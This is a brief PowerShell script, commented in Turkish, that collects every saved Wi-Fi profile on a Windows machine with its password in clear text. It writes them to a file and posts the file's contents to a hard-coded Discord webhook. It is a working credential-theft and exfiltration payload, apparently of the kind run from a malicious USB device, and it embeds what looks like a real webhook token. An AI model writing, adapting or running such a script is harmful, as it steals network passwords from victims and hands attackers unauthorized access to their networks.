# Wi-Fi profillerini dosyaya yaz
netsh wlan show profile name="*" key=clear > "$env:USERPROFILE\wifipass.txt"

# Dosya içeriğini oku
$filePath = "$env:USERPROFILE\wifipass.txt"
$fileContent = Get-Content $filePath -Raw

# Discord webhook URL'si
$webhookUrl = "https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN"

# Mesaj içeriğini obje olarak hazırla
$bodyObject = @{
    content = "```$fileContent```"
}

# JSON'a dönüştür
$jsonPayload = $bodyObject | ConvertTo-Json -Depth 3

# Discord'a POST gönder
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType "application/json"
